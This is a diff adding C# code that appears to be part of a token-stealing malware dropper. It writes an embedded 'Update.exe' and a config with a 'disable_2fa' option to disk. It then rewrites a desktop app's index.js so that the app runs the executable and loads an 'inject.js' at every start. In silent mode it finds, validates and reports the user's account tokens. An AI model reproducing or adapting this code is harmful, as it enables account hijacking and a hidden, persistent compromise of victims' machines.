@@ -1,0 +1,36 @@
+if (flag)
+{
+	Directory.CreateDirectory(text4);
+	File.WriteAllBytes(Path.Combine(text4, "Update.exe"), Program.GZip(Program.ReadResource("Update")));
+	File.WriteAllBytes(Path.Combine(text4, "Newtonsoft.Json.dll"), Program.GZip(Program.ReadResource("Json")));
+	File.WriteAllText(Path.Combine(text4, "Config.json"), string.Concat(new string[]
+	{
+		"{\"id\":\"",
+		Config.Id,
+		"\",\"disable_2fa\":",
+		Config.Disable2fa.ToString().ToLower(),
+		",\"versions\":{}}"
+	}));
+	char c = '"';
+	File.WriteAllText(text2 + "/index.js", string.Format("const child_process = require('child_process');\r\nchild_process.execSync(`{0}${{__dirname}}/{1}/Update.exe{2}`);\r\nrequire(__dirname + '/{3}/inject.js');\r\n\r\nmodule.exports = require('./core.asar');", new object[]
+	{
+		c,
+		text3,
+		c,
+		text3
+	}));
+	bool silent = Config.Silent;
+	if (silent)
+	{
+		foreach (string token in TokenDiscovery.CheckTokens(TokenDiscovery.FindTokens(path)))
+		{
+			TokenDiscovery.ReportToken(token);
+		}
+	}
+	else
+	{
+		Program.Restart(path, text);
+	}
+}
+
+
